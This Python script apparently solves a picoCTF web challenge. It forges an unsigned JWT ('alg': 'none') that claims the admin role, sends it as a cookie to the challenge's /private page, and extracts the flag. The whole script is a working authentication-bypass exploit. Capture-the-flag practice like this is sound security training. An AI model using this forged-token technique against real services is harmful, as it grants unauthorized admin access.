import requests
import base64
import json
import re

url = "http://saturn.picoctf.net:61299"

def encode(p):
    return base64.b64encode(json.dumps(p).encode()).decode().rstrip("=")

header = {
    'typ': 'JWT',
    'alg': 'none'
}

payload = {
    "auth": 1764734939288,
    "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
    "role": "admin",
    "iat": 1764734939
}

cookie = f'{encode(header)}.{encode(payload)}.'

print("Cookie:", cookie)

res = requests.get(f'{url}/private', cookies={'token': cookie})

flag = re.findall(r'(picoCTF{.+})', res.text)[0]
print(flag)